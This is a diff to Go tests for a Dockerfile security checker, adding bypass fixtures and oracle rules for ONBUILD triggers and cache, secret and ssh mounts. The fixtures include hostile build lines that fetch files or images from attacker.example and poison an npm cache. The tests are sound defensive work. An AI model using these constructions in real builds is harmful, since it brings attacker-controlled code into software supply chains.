@@ -19,13 +19,15 @@ func TestCheckDockerfileAccepts(t *testing.T) {
 		"stage case":      {"from golang:1.27 as Build\nfrom Build\ncopy --FROM=BUILD /x /x\n", []string{"golang:1.27"}},
 		"native platform": {"FROM --platform=$BUILDPLATFORM golang:1.27 AS b\nFROM --platform=${TARGETPLATFORM} alpine:3\n", []string{"alpine:3", "golang:1.27"}},
 		"copy from image": {"FROM scratch\nCOPY --from=busybox:1.37 /bin/sh /sh\n", []string{"busybox:1.37"}},
-		"mount from":      {"FROM alpine:3 AS a\nRUN --mount=type=bind,from=tools:1,target=/t --mount=type=cache,target=/c /t/run\nRUN --mount=type=bind,FROM=a,source=x,target=/a true\n", []string{"alpine:3", "tools:1"}},
+		"mount from":      {"FROM alpine:3 AS a\nRUN --mount=type=bind,from=tools:1,target=/t --mount=type=tmpfs,target=/c /t/run\nRUN --mount=type=bind,FROM=a,source=x,target=/a true\n", []string{"alpine:3", "tools:1"}},
 		"local add":       {"FROM alpine:3\nADD app.tar.gz /app/\nADD [\"a b\", \"/dst/\"]\nADD --chown=1:1 src $HOME/\n", []string{"alpine:3"}},
 		"urls elsewhere":  {"FROM alpine:3\nLABEL org.opencontainers.image.source=https://example.com/x\nRUN echo https://example.com\n", []string{"alpine:3"}},
 		"tabs and crlf":   {"FROM\talpine:3\r\nRUN\ttrue\r\n", []string{"alpine:3"}},
 		"plain comments":  {"#!/usr/bin/env docker\n# Build the app.\nFROM alpine:3\n  # indented comment\n", []string{"alpine:3"}},
 		"heredoc":         {"FROM alpine:3\nRUN <<EOF\necho hi\nEOF\n", []string{"alpine:3"}},
 		"healthcheck":     {"FROM alpine:3\nHEALTHCHECK --interval=5s CMD true\n", []string{"alpine:3"}},
+		"boolean flags":   {"FROM alpine:3\nCOPY --link a /a\nCOPY --parents --LINK=false b /b\nADD --link c /c\n", []string{"alpine:3"}},
+		"mount types":     {"FROM alpine:3\nRUN --mount=type=tmpfs,target=/t --mount=type=bind,source=x,target=/x --mount=target=/y true\n", []string{"alpine:3"}},
 	}
 	for name, tt := range tests {
 		t.Run(name, func(t *testing.T) {
@@ -70,6 +72,16 @@ var dockerfileBypasses = map[string]struct{ file, rule string }{
 	"RUN security":                {"FROM alpine:3\nRUN --Security=insecure true\n", ruleFlag},
 	"RUN device":                  {"FROM alpine:3\nRUN --device=/dev/kvm true\n", ruleFlag},
 	"RUN unknown flag":            {"FROM alpine:3\nRUN --foo=bar true\n", ruleFlag},
+	"N1 ONBUILD ADD url":          {"FROM alpine AS a\nONBUILD ADD https://attacker.example/x /x\nFROM a\n", ruleOnbuild},
+	"N1 ONBUILD COPY from":        {"FROM alpine AS a\nONBUILD COPY --from=attacker.example/evil /x /x\nFROM a\n", ruleOnbuild},
+	"N1 ONBUILD RUN mount":        {"FROM alpine AS a\nONBUILD RUN --mount=type=bind,from=attacker.example/evil,target=/m true\nFROM a\n", ruleOnbuild},
+	"N1 onbuild lower case":       {"FROM alpine:3\nonbuild RUN true\n", ruleOnbuild},
+	"N2 cache mount":              {"FROM alpine\nRUN --mount=type=cache,target=/root/.npm,sharing=shared sh -c 'echo poison > /root/.npm/x'\n", ruleMount},
+	"N2 cache mount upper":        {"FROM alpine:3\nRUN --mount=TYPE=Cache,target=/c true\n", ruleMount},
+	"N2 cache after bind":         {"FROM alpine:3\nRUN --mount=type=bind,target=/b --mount=target=/c,type=cache true\n", ruleMount},
+	"N2 secret mount":             {"FROM alpine:3\nRUN --mount=type=secret,id=npmrc true\n", ruleMount},
+	"N2 ssh mount":                {"FROM alpine:3\nRUN --mount=type=ssh true\n", ruleMount},
+	"bare unknown flag":           {"FROM alpine:3\nCOPY --chown a /a\n", ruleFlag},
 	"COPY from quoted":            {"FROM alpine:3\nCOPY --from=\"attacker.example/evil\" /x /x\n", ruleFlag},
 	"COPY from escaped":           {"FROM alpine:3\nCOPY --from=attacker\\.example/evil /x /x\n", ruleFlag},
 	"ADD remote only flag":        {"FROM alpine:3\nADD --checksum=sha256:00 x /x\n", ruleFlag},
@@ -195,12 +207,18 @@ func oracleProblems(data []byte, images, stages []string) []string {
 		if keyword == "FROM" && len(args) > 0 && !known(args[0]) {
 			problems = append(problems, "FROM image not checked: "+line)
 		}
+		if keyword == "ONBUILD" {
+			problems = append(problems, "onbuild trigger: "+line)
+		}
 		if keyword != "RUN" && keyword != "COPY" {
 			continue
 		}
 		for _, f := range flags {
 			if keyword == "RUN" && buildkitNetRe.MatchString(f) {
 				problems = append(problems, "run option: "+line)
+			}
+			if keyword == "RUN" && oracleCacheMount(f) {
+				problems = append(problems, "mount outliving the build: "+line)
 			}
 			for _, ref := range oracleFromValues(f) {
 				if !known(ref) {
@@ -210,6 +228,22 @@ func oracleProblems(data []byte, images, stages []string) []string {
 		}
 	}
 	return problems
+}
+
+// oracleCacheMount is a --mount whose type BuildKit keeps or fills from
+// the host: cache, secret or ssh, in any case.
+func oracleCacheMount(flag string) bool {
+	name, value, _ := strings.Cut(flag, "=")
+	if !strings.EqualFold(name, "--mount") {
+		return false
+	}
+	for _, kv := range strings.Split(strings.Trim(value, `"'`), ",") {
+		k, v, _ := strings.Cut(strings.Trim(kv, `"'`), "=")
+		if strings.EqualFold(strings.TrimSpace(k), "type") && !slices.Contains([]string{"bind", "tmpfs"}, strings.ToLower(v)) {
+			return true
+		}
+	}
+	return false
 }
 
 func leadingFlags(fields []string) []string {
@@ -282,6 +316,8 @@ func TestOracleCatchesOldCheck(t *testing.T) {
 		"FROM alpine\nRUN\v--network=host true\n",
 		"FROM alpine\nRUN --mount=type=bind,From=attacker.example/evil,target=/m true\n",
 		"FROM alpine\nRUN --mount=type=bind,\"from=attacker.example/evil\",target=/m true\n",
+		"FROM alpine AS a\nONBUILD ADD https://attacker.example/x /x\nFROM a\n",
+		"FROM alpine\nRUN --mount=type=cache,target=/root/.npm true\n",
 	} {
 		if len(oracleProblems([]byte(file), []string{"alpine"}, nil)) == 0 {
 			t.Errorf("oracle missed %q", file)
